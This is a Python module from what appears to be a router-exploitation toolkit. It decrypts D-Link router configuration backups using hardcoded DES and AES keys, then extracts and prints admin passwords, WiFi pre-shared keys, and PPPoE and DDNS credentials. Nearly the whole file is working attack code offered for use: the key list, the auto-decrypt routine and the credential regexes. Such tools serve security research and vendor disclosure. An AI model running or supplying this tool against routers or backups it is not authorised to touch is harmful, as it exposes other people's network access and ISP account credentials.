"""
embedxpl/modules/creds/routers/crypto/dlink_config_decrypt.py

D-Link Router Configuration Backup Decryptor.

Decrypts D-Link router configuration backup files (.bin format) that are
encrypted with DES-ECB using a fixed key. The encrypted configs contain
plaintext credentials, PPPoE passwords, WiFi PSKs, and DDNS credentials.

Affected models include: DIR-615, DIR-825, DIR-855, DIR-635, DIR-865L,
DIR-842, DIR-880L, DIR-890L, DIR-895L, DHP-1565, and many other
consumer/SOHO routers using the same firmware config format.

The encryption uses a fixed 8-byte DES key derived from the string
"12345678" (or model-specific variant). Some newer models use AES-128
with a different fixed key.

Based on research from rext (Router EXploitation Toolkit) and
dlink-config-decrypt community tools.

Author: Andre Henrique (@mrhenrike) | Uniao Geek - https://github.com/Uniao-Geek
Version: 1.0.0
"""
from __future__ import annotations

import re
import struct
from typing import Optional

__version__ = "1.0.0"

try:
    from Crypto.Cipher import DES, AES
    _CRYPTO_AVAILABLE = True
except ImportError:
    _CRYPTO_AVAILABLE = False

# Fixed DES key used by most D-Link consumer routers
_DLINK_DES_KEY = b"12345678"

# Alternative keys found in various firmware revisions
_DLINK_DES_KEYS_ALT = [
    b"12345678",
    b"GrYf0wKw",  # DIR-850L, DIR-865L, some newer firmware
    b"\x01\x23\x45\x67\x89\xAB\xCD\xEF",  # Legacy models
]

# AES-128 key for newer firmware (DIR-882, DIR-878, etc.)
_DLINK_AES_KEY = b"1234567890abcdef"

# Config file magic bytes
_DLINK_MAGIC_ENCRYPTED = b"\x00\x00\x00\x00"
_DLINK_MAGIC_V2 = b"DCFG"


def _pad_pkcs5(data: bytes, block_size: int = 8) -> bytes:
    """PKCS5/PKCS7 padding."""
    pad_len = block_size - (len(data) % block_size)
    return data + bytes([pad_len]) * pad_len


def _unpad_pkcs5(data: bytes) -> bytes:
    """Remove PKCS5/PKCS7 padding."""
    if not data:
        return data
    pad_len = data[-1]
    if pad_len < 1 or pad_len > 8:
        return data
    if data[-pad_len:] != bytes([pad_len]) * pad_len:
        return data
    return data[:-pad_len]


def decrypt_des_config(data: bytes, key: bytes = _DLINK_DES_KEY) -> Optional[bytes]:
    """Decrypt D-Link config backup using DES-ECB.

    Args:
        data: raw bytes from the .bin config backup file.
        key: 8-byte DES key (defaults to the standard fixed key).

    Returns:
        Decrypted config XML/text, or None on failure.
    """
    if not _CRYPTO_AVAILABLE:
        return None

    if len(data) < 16:
        return None

    # Skip header if present (first 4 bytes often zero or magic)
    offset = 0
    if data[:4] == _DLINK_MAGIC_ENCRYPTED:
        offset = 4
    elif data[:4] == _DLINK_MAGIC_V2:
        # V2 format: 4-byte magic + 4-byte length + encrypted data
        if len(data) < 12:
            return None
        _payload_len = struct.unpack("<I", data[4:8])[0]
        offset = 8

    encrypted = data[offset:]
    # DES-ECB requires 8-byte aligned data
    if len(encrypted) % 8 != 0:
        encrypted = encrypted[: len(encrypted) - (len(encrypted) % 8)]

    try:
        cipher = DES.new(key[:8], DES.MODE_ECB)
        decrypted = cipher.decrypt(encrypted)
    except (ValueError, KeyError):
        return None

    decrypted = _unpad_pkcs5(decrypted)

    # Validate: decrypted config should contain XML-like or INI-like content
    try:
        text = decrypted.decode("utf-8", errors="replace")
    except UnicodeDecodeError:
        text = decrypted.decode("latin-1", errors="replace")

    if any(marker in text for marker in ("<?xml", "<config", "<device", "SSID", "password", "admin")):
        return decrypted

    return None


def decrypt_aes_config(data: bytes, key: bytes = _DLINK_AES_KEY) -> Optional[bytes]:
    """Decrypt D-Link config backup using AES-128-ECB (newer models).

    Args:
        data: raw bytes from the .bin config backup file.
        key: 16-byte AES key.

    Returns:
        Decrypted config XML/text, or None on failure.
    """
    if not _CRYPTO_AVAILABLE:
        return None

    if len(data) < 32:
        return None

    offset = 0
    if data[:4] in (_DLINK_MAGIC_ENCRYPTED, _DLINK_MAGIC_V2):
        offset = 8 if data[:4] == _DLINK_MAGIC_V2 else 4

    encrypted = data[offset:]
    if len(encrypted) % 16 != 0:
        encrypted = encrypted[: len(encrypted) - (len(encrypted) % 16)]

    try:
        cipher = AES.new(key[:16], AES.MODE_ECB)
        decrypted = cipher.decrypt(encrypted)
    except (ValueError, KeyError):
        return None

    try:
        text = decrypted.decode("utf-8", errors="replace")
    except UnicodeDecodeError:
        text = decrypted.decode("latin-1", errors="replace")

    if any(marker in text for marker in ("<?xml", "<config", "<device", "SSID", "password", "admin")):
        return decrypted

    return None


def auto_decrypt(data: bytes) -> Optional[tuple[bytes, str]]:
    """Try all known D-Link decryption methods automatically.

    Returns:
        Tuple of (decrypted_data, method_description) or None.
    """
    # Try DES with all known keys
    for key in _DLINK_DES_KEYS_ALT:
        result = decrypt_des_config(data, key)
        if result is not None:
            return result, f"DES-ECB key={key!r}"

    # Try AES
    result = decrypt_aes_config(data)
    if result is not None:
        return result, f"AES-128-ECB key={_DLINK_AES_KEY!r}"

    return None


def extract_credentials(config_text: str) -> list[dict[str, str]]:
    """Extract credentials from decrypted D-Link config.

    Searches for admin passwords, WiFi PSKs, PPPoE credentials, and
    DDNS authentication.

    Returns:
        List of dicts with keys: type, context, value.
    """
    creds: list[dict[str, str]] = []
    patterns = [
        (r"<admin_password>([^<]+)</admin_password>", "admin_password"),
        (r"<user_password>([^<]+)</user_password>", "user_password"),
        (r"<pppoe_password>([^<]+)</pppoe_password>", "pppoe_password"),
        (r"<pppoe_username>([^<]+)</pppoe_username>", "pppoe_username"),
        (r"<pre_shared_key>([^<]+)</pre_shared_key>", "wifi_psk"),
        (r"<wpa_psk>([^<]+)</wpa_psk>", "wifi_psk"),
        (r"<ddns_password>([^<]+)</ddns_password>", "ddns_password"),
        (r"<ddns_username>([^<]+)</ddns_username>", "ddns_username"),
        (r'password="([^"]+)"', "password_attr"),
        (r"SSID=([^\r\n]+)", "wifi_ssid"),
    ]
    for pat, cred_type in patterns:
        for match in re.finditer(pat, config_text, re.IGNORECASE):
            creds.append({
                "type": cred_type,
                "context": match.group(0)[:120],
                "value": match.group(1),
            })
    return creds


if __name__ == "__main__":
    import sys

    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <config.bin>")
        sys.exit(1)

    filepath = sys.argv[1]
    with open(filepath, "rb") as f:
        raw = f.read()

    result = auto_decrypt(raw)
    if result is None:
        print("[!] Failed to decrypt. Unknown format or key.")
        sys.exit(1)

    decrypted, method = result
    print(f"[+] Decrypted with: {method}")
    print(f"[+] Size: {len(decrypted)} bytes")

    text = decrypted.decode("utf-8", errors="replace")
    creds = extract_credentials(text)
    if creds:
        print(f"\n[+] Found {len(creds)} credential(s):")
        for c in creds:
            print(f"    [{c['type']}] {c['value']}")
    else:
        print("\n[-] No credentials found in decrypted config.")

    outpath = filepath + ".decrypted"
    with open(outpath, "wb") as f:
        f.write(decrypted)
    print(f"\n[+] Decrypted config saved to: {outpath}")
